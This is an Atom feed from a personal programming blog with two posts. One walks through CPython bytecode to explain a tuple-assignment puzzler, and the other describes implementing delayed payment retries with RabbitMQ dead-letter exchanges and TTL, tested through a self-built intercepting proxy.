<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Qiu's Quibble]]></title>
  <link href="http://kevinjqiu.github.io/atom.xml" rel="self"/>
  <link href="http://kevinjqiu.github.io/"/>
  <updated>2015-09-04T00:02:53-04:00</updated>
  <id>http://kevinjqiu.github.io/</id>
  <author>
    <name><![CDATA[Kevin Jing Qiu]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Use Python bytecode to solve puzzler]]></title>
    <link href="http://kevinjqiu.github.io/2015/09/03/use-python-bytecode-to-solve-puzzler/"/>
    <updated>2015-09-03T22:16:36-04:00</updated>
    <id>http://kevinjqiu.github.io/2015/09/03/use-python-bytecode-to-solve-puzzler</id>
    <content type="html"><![CDATA[<h2>Learning Python Internals</h2>

<p>Recently I stumbled upon <a href="https://www.youtube.com/playlist?list=PLwyG5wA5gIzgTFj5KgJJ15lxq5Cv6lo_0">this wonderful set of videos on Python interpreter internals</a>. (Thanks to <a href="http://pgbovine.net/">Philip Guo</a> for creating them and thanks to Michael Kennedy (@mkennedy) and his <a href="http://talkpython.fm/">Talk Python to me</a> show that brought this on my radar)</p>

<p>I&rsquo;ve been using Python for about ten years but I&rsquo;ve never really truly been able to understand how the interpreter works, nor was I familiar with the Python virtual machine or the bytecode. These videos may just be the extra help I needed to get me started at the internals of Python.</p>

<p>So far, I&rsquo;ve only watched 2 lectures and I&rsquo;m already learning a lot. I learned where to find a list of opcodes in the source code, where the main eval loop is, and what internal states the Python virtual machine keeps.</p>

<p>Then I thought to myself, why not use this new found power to solve some Python mysterious that have been puzzling me?</p>

<h2>The puzzler</h2>

<p>A few days ago, one of my former co-workers posted this puzzler:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">=</span> <span class="p">{},</span> <span class="mi">5</span>
</span></code></pre></td></tr></table></div></figure>


<p>What are the values of <code>a</code> and <code>b</code> after the assignment? Well, it&rsquo;s not obvious what the order of assignment it is going to be. Putting it in the REPL gives us this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="n">b</span><span class="p">]</span> <span class="o">=</span> <span class="p">{},</span> <span class="mi">5</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span>
</span><span class='line'><span class="p">{</span><span class="mi">5</span><span class="p">:</span> <span class="p">({</span><span class="o">...</span><span class="p">},</span> <span class="mi">5</span><span class="p">)}</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span>
</span><span class='line'><span class="p">({</span><span class="mi">5</span><span class="p">:</span> <span class="p">({</span><span class="o">...</span><span class="p">},</span> <span class="mi">5</span><span class="p">)},</span> <span class="mi">5</span><span class="p">)</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'><span class="p">{</span><span class="mi">5</span><span class="p">:</span> <span class="p">({</span><span class="o">...</span><span class="p">},</span> <span class="mi">5</span><span class="p">)}</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="mi">5</span><span class="p">]</span>
</span><span class='line'><span class="p">({</span><span class="mi">5</span><span class="p">:</span> <span class="p">({</span><span class="o">...</span><span class="p">},</span> <span class="mi">5</span><span class="p">)},</span> <span class="mi">5</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>OK, so there appears to be a circular reference going on here. The object that <code>a</code> refers to has an element that refers to the object that <code>a</code> refers to and so on and so forth. Now, the question is, how did the circular reference get there?</p>

<p>Well, all Python source code eventually get compiled down to bytecode and executed on the virtual machine. In order to understand what that line actually does, we need to look at the byte code.</p>

<p>It turns out that Python comes with a module to disassemble source code into byte codes (assembly for the virtual machine):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">dis</span>
</span><span class='line'><span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="p">{},</span> <span class="mi">5</span>
</span><span class='line'><span class="o">^</span><span class="n">D</span>
</span><span class='line'>  <span class="mi">1</span>           <span class="mi">0</span> <span class="n">BUILD_MAP</span>                <span class="mi">0</span>
</span><span class='line'>              <span class="mi">3</span> <span class="n">LOAD_CONST</span>               <span class="mi">0</span> <span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'>              <span class="mi">6</span> <span class="n">BUILD_TUPLE</span>              <span class="mi">2</span>
</span><span class='line'>              <span class="mi">9</span> <span class="n">DUP_TOP</span>
</span><span class='line'>             <span class="mi">10</span> <span class="n">UNPACK_SEQUENCE</span>          <span class="mi">2</span>
</span><span class='line'>             <span class="mi">13</span> <span class="n">STORE_NAME</span>               <span class="mi">0</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span><span class='line'>             <span class="mi">16</span> <span class="n">STORE_NAME</span>               <span class="mi">1</span> <span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>             <span class="mi">19</span> <span class="n">LOAD_NAME</span>                <span class="mi">0</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span><span class='line'>             <span class="mi">22</span> <span class="n">LOAD_CONST</span>               <span class="mi">0</span> <span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'>             <span class="mi">25</span> <span class="n">STORE_SUBSCR</span>
</span><span class='line'>             <span class="mi">26</span> <span class="n">LOAD_CONST</span>               <span class="mi">1</span> <span class="p">(</span><span class="bp">None</span><span class="p">)</span>
</span><span class='line'>             <span class="mi">29</span> <span class="n">RETURN_VALUE</span>
</span></code></pre></td></tr></table></div></figure>


<p>Alright, so that humble little line of code is actually 12 instructions for the Python virtual machine. Each instruction manipulates the virtual machine&rsquo;s internal state in some way. CPython is a stack-based interpreter, which means certain instructions puts values on the stack and other instructions consume them from the stack.</p>

<p>Let&rsquo;s go through the instructions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">0</span> <span class="n">BUILD_MAP</span>                <span class="mi">0</span>
</span></code></pre></td></tr></table></div></figure>


<p>First off, it tells the interpreter to make a map object and put it on the value stack. After this instruction, our value stack looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">+----+</span>
</span><span class='line'><span class="o">|</span> <span class="p">{}</span> <span class="o">|</span>
</span><span class='line'><span class="o">+----+</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next up:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">3</span> <span class="n">LOAD_CONST</span>               <span class="mi">0</span> <span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This loads a constant (<code>5</code>) on the stack.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">+----+</span>
</span><span class='line'><span class="o">|</span> <span class="p">{}</span> <span class="o">|</span>
</span><span class='line'><span class="o">+----+</span>
</span><span class='line'><span class="o">|</span> <span class="mi">5</span>  <span class="o">|</span>
</span><span class='line'><span class="o">+----+</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">6</span> <span class="n">BUILD_TUPLE</span>              <span class="mi">2</span>
</span></code></pre></td></tr></table></div></figure>


<p>This instruction builds a <code>PyTuple</code> object of size <code>2</code>, which is in the argument of the opcode. It consumes the top <code>2</code> things on the stack and make a 2-tuple using these values and put the result tuple on the value stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span> <span class="p">({},</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">9</span> <span class="n">DUP_TOP</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next we have the <code>DUP_TOP</code> instruction. It probably stands for &ldquo;duplicate the top of the stack&rdquo;, and reading the corresponding code in the eval loop, this seems to be what it&rsquo;s doing: it gets the object from the top of the stack without popping it off and push the value on the stack, while incrementing the refcount of the object.</p>

<p>It&rsquo;s worth noting that this only duplicates the tuple object. The elements inside the tuple are of type <code>*PyObject</code>, which are pointers to the corresponding values (the dict and the integer), and are not duplicated by this instruction. Here&rsquo;s the value stack after this instruction:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span> <span class="p">({},</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span> <span class="p">({},</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">10</span> <span class="n">UNPACK_SEQUENCE</span>          <span class="mi">2</span>
</span></code></pre></td></tr></table></div></figure>


<p>The next instruction is <code>UNPACK_SEQUENCE</code> with argument <code>2</code>. This will first pop the stack, so <code>({}, 5)</code> is off the stack, and then push each element from the tuple on the stack in reverse order. After this instruction, the stack will be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span> <span class="p">({},</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span>   <span class="mi">5</span>     <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span>   <span class="p">{}</span>    <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">13</span> <span class="n">STORE_NAME</span>               <span class="mi">0</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span><span class='line'><span class="mi">16</span> <span class="n">STORE_NAME</span>               <span class="mi">1</span> <span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The next two instructions deal with &ldquo;names&rdquo;, which are variables for the scope of the frame. <code>STORE_NAME a</code> will pop the stack, and point <code>a</code> to the value, and similarily for <code>STORE_NAME b</code>. After this instruction, there will be two bindings in the frame: <code>a</code> and <code>b</code> and the stack will be back to having only one element, the tuple:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">stack</span><span class="p">:</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span> <span class="p">({},</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'>
</span><span class='line'><span class="n">bindings</span><span class="p">:</span>
</span><span class='line'><span class="n">a</span> <span class="o">&lt;-</span> <span class="p">{}</span>
</span><span class='line'><span class="n">b</span> <span class="o">&lt;-</span> <span class="mi">5</span>
</span></code></pre></td></tr></table></div></figure>


<p>The next two instructions:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">19</span> <span class="n">LOAD_NAME</span>                <span class="mi">0</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span>
</span><span class='line'><span class="mi">22</span> <span class="n">LOAD_CONST</span>               <span class="mi">0</span> <span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>LOAD_NAME a</code> will push the value that the variable is bound to on the stack, so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">stack</span><span class="p">:</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span> <span class="p">({},</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span>    <span class="p">{}</span>   <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'>
</span><span class='line'><span class="n">bindings</span><span class="p">:</span>
</span><span class='line'><span class="n">a</span> <span class="o">&lt;-</span> <span class="p">{}</span>
</span><span class='line'><span class="n">b</span> <span class="o">&lt;-</span> <span class="mi">5</span>
</span></code></pre></td></tr></table></div></figure>


<p>and <code>LOAD_CONST 5</code>, as we&rsquo;ve seen before, simply pushes the constant <code>5</code> on the stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">stack</span><span class="p">:</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span> <span class="p">({},</span> <span class="mi">5</span><span class="p">)</span> <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span>    <span class="p">{}</span>   <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'><span class="o">|</span>     <span class="mi">5</span>   <span class="o">|</span>
</span><span class='line'><span class="o">+---------+</span>
</span><span class='line'>
</span><span class='line'><span class="n">bindings</span><span class="p">:</span>
</span><span class='line'><span class="n">a</span> <span class="o">&lt;-</span> <span class="p">{}</span>
</span><span class='line'><span class="n">b</span> <span class="o">&lt;-</span> <span class="mi">5</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">25</span> <span class="n">STORE_SUBSCR</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is where the magic happens. <code>STORE_SUBSCR</code> is an instruction to set element on the dictionary given the index. Here&rsquo;s the code that handles this opcode in the eval loop:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">TARGET_NOARG</span><span class="p">(</span><span class="n">STORE_SUBSCR</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">w</span> <span class="o">=</span> <span class="n">TOP</span><span class="p">();</span>
</span><span class='line'>    <span class="n">v</span> <span class="o">=</span> <span class="n">SECOND</span><span class="p">();</span>
</span><span class='line'>    <span class="n">u</span> <span class="o">=</span> <span class="n">THIRD</span><span class="p">();</span>
</span><span class='line'>    <span class="n">STACKADJ</span><span class="p">(</span><span class="o">-</span><span class="mi">3</span><span class="p">);</span>
</span><span class='line'>    <span class="o">/*</span> <span class="n">v</span><span class="p">[</span><span class="n">w</span><span class="p">]</span> <span class="o">=</span> <span class="n">u</span> <span class="o">*/</span>
</span><span class='line'>    <span class="n">err</span> <span class="o">=</span> <span class="n">PyObject_SetItem</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">,</span> <span class="n">u</span><span class="p">);</span>
</span><span class='line'>    <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">u</span><span class="p">);</span>
</span><span class='line'>    <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">v</span><span class="p">);</span>
</span><span class='line'>    <span class="n">Py_DECREF</span><span class="p">(</span><span class="n">w</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">err</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">DISPATCH</span><span class="p">();</span>
</span><span class='line'>    <span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here, <code>TOP</code>, <code>SECOND</code>, <code>THIRD</code> are macros that take values off of the value stack. Given our state of the virtual machine:
* <code>w = TOP()</code> => <code>w = 5</code>
* <code>v = SECOND()</code> => <code>v = {}</code>
* <code>w = THIRD()</code> => <code>w = ({}, 5)</code>, but keep in mind, the first element in <code>w</code> (the tuple) is actually the same object <code>v</code> is pointing to.</p>

<p>Thus, calling <code>PyObject_SetItem(v, w, u)</code> sets <code>v[w] = u</code> => <code>v[5] = (v, 5)</code>, and there a circular reference is born!</p>

<p>From the sequence of operation, we can tell the order by which the assignments were executed:
1. <code>a, b = {}, 5</code>
2. <code>a[5] = ({}, 5)</code>, with <code>a</code> refering to the dictionary</p>

<h2>Conclusion</h2>

<p>Diving into the Python implementation is the next level ninjary that may come in handy in some cases. Granted, no one is going to write production code like the one in the puzzler, but stepping through and visualizing the virtual machine is a pretty useful and fun experience that makes me appreciate more the language I use everyday.</p>

<p>Again, thanks to Philip Guo for the videos and Michael Kennedy for the podcast. Also, checkout Professor Guo&rsquo;s <a href="http://www.pythontutor.com/">python tutor</a> for visualizing how code is run.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Use rabbitmq DLX to implement delayed retry]]></title>
    <link href="http://kevinjqiu.github.io/2015/04/30/use-rabbitmq-dlx-to-implement-delayed-retry/"/>
    <updated>2015-04-30T00:37:42-04:00</updated>
    <id>http://kevinjqiu.github.io/2015/04/30/use-rabbitmq-dlx-to-implement-delayed-retry</id>
    <content type="html"><![CDATA[<p>In this post, I&rsquo;m going to describe the experience at <code>$DAYJOB</code> regarding implementing delayed retry using <a href="https://www.rabbitmq.com/">rabbitmq</a>&rsquo;s <a href="https://www.rabbitmq.com/dlx.html">DLX</a> combined with a TTL. The technique has been described at a few <a href="http://yuserinterface.com/dev/2013/01/08/how-to-schedule-delay-messages-with-rabbitmq-using-a-dead-letter-exchange/">places</a> but it is new to me personally and our company. I&rsquo;d like to capture the experience we had both in implementing and in deploying to production.</p>

<h1>The problem</h1>

<p>At <code>$DAYJOB</code> we have a service that integrates with a 3rd-party API that processes credit card payments and when successful, records a payment object on our customer&rsquo;s invoices, and change the invoice status. Pretty straight-forward stuff. However, lately we&rsquo;ve been experiencing an elevated amount of random failures from our service provider.</p>

<p>Calls to our provider to create a checkout using the client&rsquo;s credit card information would time out randomly, or return an &ldquo;unknown error&rdquo;. When it happens, we don&rsquo;t record a payment object on the invoice since we don&rsquo;t know the actual status of the checkout, nor do we have the <code>reference_id</code> for the checkout. However, as we discovered, some of these timed-out calls did go through and the clients&#8217; credit cards charged.</p>

<p>We checked with our service provider and were told that they have been experiencing increased volumes and their infrastructure currently can&rsquo;t keep up. However, they suggest that we use an undocumented feature which allows a <code>unique_id</code> to be passed in along with the checkout call. The <code>unique_id</code> serves as an idempotent key (similar to <a href="https://stripe.com/docs/api?lang=curl#idempotent_requests">Stripe&rsquo;s</a>). Multiple calls with the same <code>unique_id</code> won&rsquo;t create multiple checkout objects on their end and thus ensuring the checkout is made but won&rsquo;t double/triple charge the customer&rsquo;s car.</p>

<h1>Architecting the solution</h1>

<p>Armed with this new secret API feature, our team goes back to the drawing board. At work, we use <a href="https://www.rabbitmq.com/">rabbitmq</a> extensively for asynchronous processing. If some operation doesn&rsquo;t have to be carried out synchronously with a web request, we throw a message on the queue and have a queue consumer process that message and update states. We use a library called <a href="https://github.com/ojacobson/sparkplug">sparkplug</a> that makes writing queue consumer super-easy. So, everything seems to fall in friendly terrotiries: we make a checkout call with a random id and when we encounter timeout or unknown error, instead of returning an error response to the user, we return <code>202 Accepted</code> to our user and throw a message on the queue, so a consumer can grab it and retry the checkout with the same original <code>unique_id</code>.</p>

<h1>The missing piece</h1>

<p>However, we quickly realized it&rsquo;s not that simple. What if the retry encountered the same error? We can put it back on the queue, but when does it get processed by the consumer again? We want to add a time delay to the subsequent retries, and the orginal retry as well.</p>

<h1><a href="https://www.rabbitmq.com/dlx.html">Dead-Letter-Exchange</a> and <a href="https://www.rabbitmq.com/ttl.html">TTL</a></h1>

<p>After some research on the internet, seems like this problem has been <a href="https://www.cloudamqp.com/docs/delayed-messages.html">solved</a> <a href="http://yuserinterface.com/dev/2013/01/08/how-to-schedule-delay-messages-with-rabbitmq-using-a-dead-letter-exchange/">before</a>.</p>

<p>The idea here is that you have two queues: <code>Qa</code> and <code>Qb</code>.  When a checkout request times out, we put a message on a <code>Qa</code>.  <code>Qa</code> is declared with <code>x-dead-letter-exchange</code>, <code>x-dead-letter-routing-key</code> and <code>x-message-ttl</code> (in milliseconds).  When the message is in <code>Qa</code> for <code>ttl</code> milliseconds, the message will be re-routed to the specified dead-letter-exchange with the routing key.  We can bind <code>Qb</code> to the exchange with the routing key, and attach a consumer to only <code>Qb</code> and retry the checkout call.</p>

<p>If the retry call fails for the same reason (timeout or unknown error), we re-publish the message to <code>Qa</code> again and acknowledges the message so it&rsquo;s no longer in <code>Qb</code>.</p>

<p><img class="center" src="http://kevinjqiu.github.io/assets/images/dlx_1.png"></p>

<p>The whole flow looks like this:</p>

<p><img class="center" src="http://kevinjqiu.github.io/assets/images/dlx_2.png"></p>

<h1>Implementation, Testing Strategy and Deployment saga</h1>

<h2>Implementation</h2>

<p>Implementation is probably the most straight-forward phase of the project once we have the design on paper.  The only obstacle is that the library we use for writing rabbitmq consumers (sparkplug) does not support declaring queues with extra parameters, and the DLX related parameters: <code>x-dead-letter-exchange</code> <code>x-dead-letter-routing-key</code>, and <code>x-message-ttl</code> are all &ldquo;extra parameters&rdquo; according to <code>amqplib</code>, which is used by sparkplug. To solve this, I sent this <a href="https://github.com/ojacobson/sparkplug/pull/10/files">PR</a> to sparkplug, so it recognizes extra parameters and pass them down to amqp library.</p>

<p>Another road block appeared when we ran the system on our dev images for the first time. The underlying amqplib would error out on startup. Upon closer investigation, it appeared the error happened while talking to rabbitmq and the amqplib can&rsquo;t handle certain rabbitmq frames. So I went searching for the amqp project, only to find out that it was deprecated <a href="https://pypi.python.org/pypi/amqplib">long ago</a>. Fortunately, there&rsquo;s a fork of the library <a href="https://pypi.python.org/pypi/amqp">amqp</a> that&rsquo;s maintained by the reputable <a href="http://www.celeryproject.org/">Celery project</a>. It&rsquo;s has API compatibility with amqplib and appeared to be a drop-in replacement. We dropped it in and everything seems to work. Reading the online literature, it seems to be the case that the old library does not handle the <code>TTL</code> amqp extension.</p>

<h2>Testing Strategy</h2>

<p>So, since the 3rd party API timeout is an edge case, they did not provide a way trigger this behaviour the same way we can trigger, say, a declined transaction. We could fake the URL for the 3rd party service in DNS or <code>/etc/hosts</code> or we can change the SDK to change the base url for their API to somewhere else and cause a timeout that way, but neither is ideal. The biggest disadvantage is that we have no way of getting a request out of the retry state.</p>

<p>Eventually, we decided to <a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM</a> ourselves :) We can write a simple proxy server, and for the most part, it&rsquo;s going to be a pass-through, but on certain requests, we intercept it and return an unknown error (500 series with specific response body).  To trigger it, we set the checkout amount to <code>$666</code>, and in the proxy, we keep an internal counter based on the checkout&rsquo;s unique id, and increment the counter every time it&rsquo;s retried, and then we can set a max retry threshold in the proxy so the proxy becomes a pass through again if the max retry threshold is reached.</p>

<p>We used this small nifty library <a href="https://github.com/allfro/pymiproxy">pymiproxy</a> as a base for our proxy server. It turns out the proxy is pretty straight-forward as well, and a big shout-out to the author of pymiproxy.</p>

<h2>Deployment</h2>

<p>Everything until now is like a cake walk. Sure, there are some problems with the underlying libraries but that requires patching but they were quite easy to identify and fix. Deployment, on the other hand, has been like riding on the <a href="https://www.youtube.com/watch?v=Mgsbau5qkTE">Behemoth in Canada&rsquo;s Wonderland</a>.</p>

<p>First of all, while getting the code onto the testing environment, we encountered the first gremlin. The staging is running on the exact same version of rabbitmq and the exact same configuration. However, on staging, when a message is published on the DLQ (<code>Qa</code>) in our example, after <code>TTL</code>, the message would simply disappear and did not get routed to <code>Qb</code>. What&rsquo;s worse, sometimes even <code>Qa</code> is completely gone after the message is dropped on the floor! This is terribly frustrating. The queue is declared as durable, and so is the exchange. I even did a side-by-side comparison of the sparkplug log output to see if anything is different. Well, there was! The declaration sequence is different between staging and dev. On dev, the dead-letter exchange is declared before <code>Qa</code> which specifies <code>x-dead-letter-exchange</code>. That makes sense! Reading the <a href="https://github.com/ojacobson/sparkplug/blob/master/sparkplug/config/__init__.py#L57-L77">sparkplug code</a>, it calculates the dependencies between queues, exchanges, bindings and consumers to determine the order of which they should be declared. However, our modification that enabled sparkplug to pass down DLX, but sparkplug has no idea that the queue depends on the DLX! Based on this observation, I cooked up another <a href="https://github.com/freshbooks/sparkplug/pull/2/files">PR</a> such that if DLX is specified, make sure we make the DLX a dependency of the queue so the exchange gets declared before it. Did a few tests locally, and hey, it appears to be working!</p>

